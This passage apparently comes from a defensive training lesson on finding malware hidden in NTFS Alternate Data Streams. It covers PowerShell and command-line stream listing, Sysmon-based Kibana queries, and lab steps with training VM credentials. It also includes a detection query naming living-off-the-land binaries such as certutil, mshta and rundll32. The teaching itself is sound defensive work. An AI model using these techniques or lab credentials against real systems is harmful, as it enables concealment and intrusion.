Even if alerts are not configured, a Kibana query on a Security Information and Event Manager (SIEM) that contains Sysmon logs may be constructed to find executable files hidden in an ADS, such as the following.
event.module:"sysmon" and event.code:15 and not winlog.event_data.Hash :"IMPHASH=00000000000000000000000000000000"



Analysis of the File System


File systems may be investigated or monitored with scripts that employ file system listing techniques built into the standard command-line terminals. When an unexpected ADS is identified, if that stream is related to the execution of a malicious process or activity, the metadata of the file in question (such as ownership, permissions, and timestamp metadata) can provide valuable information about which user accounts may have been compromised and when a compromise occurred. 


PowerShell


The Stream attribute may be stipulated for the file object-oriented cmdlets, such as Get-Item, Get-ChildItem, Get-Content, or Set-Content. The syntax for retrieving the stream names of a series of file objects is as follows:
<set of file objects> | ForEach-Object { Get-Item $_.FullName -Stream * }



Because every file has a default $DATA stream, it is useful to filter those streams out of the set of results with a further transformation such as Where Stream -ne ':$DATA':
Get-ChildItem -Recurse | % { Get-Item $_.FullName -Stream * } | Where Stream -ne ':$Data'



When the name of an ADS is known, the content of that stream may be retrieved with the Get-Content cmdlet and displayed if it is ASCII readable or stored in a variable if it is not:
Get-Content C:\Path\to\File.extension -Stream ADSName



Windows Command Line


In addition to the other flags that may be used with the dir command, such as those for listing files and folders recursively or displaying hidden folders, the /R flag displays all file streams in a directory listing, which may be used to uncover an ADS used by malicious actors:
dir /R



Sysinternals Streams.exe


Streams is a third-party tool developed by SysInternals and owned by Microsoft. Streams is used to check which files in a file system have ADSs. However, this tool is useful only for listing which files have ADSs, not for exposing what is inside the stream itself.


Analysis of Running Processes


Unless the attacker is performing additional rootkit-level hiding of malware, hiding files in an ADS does not prevent them or their artifacts from appearing in active network connections or lists of running processes.


Utilities such as the following still show established or listening ports and running processes:
Netstat 
Tasklist
PowerShell Get-Process
PowerShell Get-NetTCPConnection


For example, the malicious program marked in red in Figure 20.3-5 still appears in the output of Tasklist with the name of the executable, which is hidden in an ADS.

![image](https://github.com/user-attachments/assets/4f9e4ffb-39da-481a-9194-bf560a8d1207)

![image](https://github.com/user-attachments/assets/2db4dd1f-385b-49fa-a539-e5bee4ebd5f7)

----------------


Analyze Alternate Data Streams Hiding Tradecraft
When performing a static analysis of a system in which ADS hiding is suspected, manual inspection with PowerShell and built-in system tools is an invaluable skill. 

﻿

Analyze a Threat Actor Tool in an ADS
﻿

Use the file system investigation methods described previously to identify a threat actor tool hiding in an ADS on a Windows machine. Investigate that system for indications that ADS hiding has occurred, and gather system information to determine details about the ADS hiding activity. 

﻿

Workflow
﻿

1. Log in to the Virtual Machine (VM) win-hunt using the following credentials:

Username: trainee
Password: CyberTraining1!
﻿

2. Enter the following command to begin a remote PowerShell session to investigate the workstation eng-wkstn-1, located at Internet Protocol (IP) address 172.16.4.2, using the following credentials:

Enter-PSSession (New-PSSession -ComputerName 172.16.4.2 -Credential (Get-Credential))

Username: energy\trainee
Password: CyberTraining1!
﻿

3. Obtain a directory listing by entering the PowerShell alias for Get-ChildItem:

gci


![image](https://github.com/user-attachments/assets/13136b3a-ec1e-4db1-9076-e36c95792826)


The directory listing, provided in Figure 20.3-6, shows numerous documents. According to threat intelligence passed to the security team, one of these documents has a malicious executable stored in an ADS. 


4. Run the following command to list all file streams that are not the default $DATA stream:
Get-ChildItem -Recurse | % { Get-Item $_.FullName -Stream * } | Where Stream -ne ':$Data'



Figure 20.3-7 illustrates these file streams: 


![image](https://github.com/user-attachments/assets/85cfaf8d-6b2f-4f55-b96a-1272588ce055)


Many of these file streams are the zone identifier of the file, which means that the file was downloaded from the internet and the browser automatically inserts the download Uniform Resource Locator (URL) in an ADS of the file on NTFS systems. This is seen by getting the content of the file with a command such as the following:
Get-Content .\2022planner.xlsx -Stream Zone.Identifier



The output of the command is shown in Figure 20.3-8:

![image](https://github.com/user-attachments/assets/33e790f5-b52d-4579-882d-c75945cdbcb6)


5. Perform rudimentary analysis on the output of these commands to determine which stream stands out from the others, and answer the following question.

![image](https://github.com/user-attachments/assets/e72de9ad-37b6-49ed-9f7e-2b93810f355c)

------------------------

Analyze Alternate Data Streams Hiding Tradecraft
While performing necessary tradecraft to hide their tools in an ADS and execute it from those streams, threat actors leave several traces that may be logged and identified for follow-on Incident Response (IR) action.

﻿

Analyze Evidence of Malware Hidden and Executed from an ADS
﻿

Use the detection and investigation methods described previously to identify a threat actor tool hiding in an ADS on a Windows machine and identify traces of its execution in logs. Investigate a system for indications that ADS/process hiding has occurred, and gather system information to determine details about the ADS/process-hiding activity. 

﻿

Workflow
﻿

1. Log in to the VM eng-wkstn-2 using the following credentials:

Username: trainee
Password: CyberTraining1!
﻿

2. Select the shortcut on the victim’s desktop to emulate an unwitting user. This triggers a client-side attack that downloads a staged malicious payload and hides in an ADS and then executes that payload to call back to a threat adversary server.

﻿

3. Log in to the win-hunt analyst workstation using the following credentials:

Username: trainee
Password: CyberTraining1!
﻿

4. Open Google Chrome, and select the Discover Elastic bookmark. Enter the following credentials when prompted:

Username: trainee@jdmss.lan
Password: CyberTraining1!
﻿

5. Run the following Kibana query to examine logs that potentially indicate the malicious executable hiding and process execution that occurred. Modify the query as needed to identify any tradecraft that has been discussed in this lesson.

(event.module:"sysmon" and event.code:1 and (process.executable:*certutil.exe or process.executable:*cmd.exe or process.executable:*control.exe or process.executable:*cscript.exe or process.executable:*esentutl.exe or process.executable:*findstr.exe or process.executable:*forfiles.exe or process.executable:*mshta.exe or process.executable:*rundll32.exe or process.executable:*powershell.exe or process.executable:*wmic.exe or process.executable:*wscript.exe or process.command_line :*.*\:*)) or (event.module:"windows_eventlog"  and event.code:4656) or (event.module:"sysmon" and event.code:15 and not winlog.event_data.Hash :"IMPHASH=00000000000000000000000000000000")
﻿

6. Answer the following question about what the investigation uncovered.


![image](https://github.com/user-attachments/assets/53a2f426-62e1-4050-987b-c24f33266137)


-----------------


















